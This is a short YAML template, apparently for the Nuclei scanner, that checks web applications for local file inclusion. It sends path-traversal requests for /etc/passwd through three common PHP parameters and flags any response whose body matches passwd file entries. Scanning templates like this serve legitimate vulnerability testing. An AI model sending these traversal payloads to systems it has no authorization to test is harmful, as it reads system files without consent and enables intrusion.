id: THENAWABX_LFI_VULN
info:
  name: 📂 Nawab-LFI-Vulnerability-Hunter 📂
  author: thenawabx
  severity: high

http:
  - method: GET
    path:
      - "{{BaseURL}}/index.php?page=../../../../etc/passwd"
      - "{{BaseURL}}/view.php?file=../../../../etc/passwd"
      - "{{BaseURL}}/load.php?path=../../../../etc/passwd"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - "root:x:[0-9]*:[0-9]*:"

      - type: word
        part: body
        negative: true
        words:
          - "not found"
          - "Error 404"
        condition: or